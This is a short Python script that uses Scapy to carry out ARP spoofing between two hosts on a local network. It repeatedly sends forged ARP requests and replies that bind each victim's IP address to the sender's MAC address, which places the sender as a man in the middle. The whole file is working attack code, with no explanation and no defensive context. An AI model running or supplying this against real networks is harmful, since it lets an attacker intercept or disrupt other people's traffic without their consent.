from scapy.all import *
import time

IF = "en8"

#M_MAC ='00:05:1b:a8:6d:d3'
M_MAC ='00:01:02:03:04:05'

MAC1 = 'ec:21:e5:5f:19:fd'
MAC2 = 'e4:b9:7a:37:6a:07'

ip1 = '192.168.11.111'
ip2 = '192.168.11.211'

frame11 = Ether(dst=MAC1,src=M_MAC) / ARP(op=1,pdst=ip1,psrc=ip2,hwsrc=M_MAC)
frame12 = Ether(dst=MAC1,src=M_MAC) / ARP(op=2,pdst=ip1,psrc=ip2,hwsrc=M_MAC)
frame21 = Ether(dst=MAC2,src=M_MAC) / ARP(op=1,pdst=ip2,psrc=ip1,hwsrc=M_MAC)
frame22 = Ether(dst=MAC2,src=M_MAC) / ARP(op=2,pdst=ip2,psrc=ip1,hwsrc=M_MAC)


while True:
    frame11.show()
    sendp(frame11,iface=IF)
    frame12.show()
    sendp(frame12,iface=IF)
    time.sleep(0.1)
    frame21.show()
    sendp(frame21,iface=IF)
    frame22.show()
    sendp(frame22,iface=IF)
    time.sleep(0.1)
